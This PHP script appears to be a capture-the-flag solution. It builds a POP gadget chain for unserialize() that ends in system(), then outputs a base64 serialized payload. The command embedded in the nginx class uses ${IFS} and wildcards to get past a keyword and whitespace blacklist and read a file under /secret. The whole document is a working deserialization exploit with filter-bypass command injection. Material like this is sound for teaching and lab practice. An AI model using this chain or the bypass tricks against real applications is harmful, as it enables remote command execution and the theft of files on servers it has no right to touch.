<?php
class apache{
    public $lin;
    public function __toString(){
        $this->lin->check();
        return '';
    }
}
class tomcat{
    public $drew;
    public function __get($name) {
        ($this->drew)();
    }
}
class nginx{
    private $pay='system';
    private $par='cd${IFS}/secret;cd${IFS}p*;rev${IFS}p*';
    public function check() {
        if (!preg_match("/(cat|tac|flag)|\/[^\/]*\/|\s+|(\.\.\/)/i", $this->par)) {
            ($this->pay)($this->par);
        } else {
            die("勇师傅察觉到你的参数不对劲");
        }
    }
}
class eva1{
    public $old;
    public $new;
    public function __wakeup() {
        $this->old->new;
    }
}
class iis {
    public $kha="hello myon!";
    public function __invoke(){
        ucwords($this->kha);
    }
}

$n = new nginx();
$a = new apache();
$a->lin=$n;
$i =new iis();
$i->kha=$a;
$t = new tomcat();
$t->drew=$i;
$e = new eva1();
$e->old=$t;
echo base64_encode((serialize($e)));

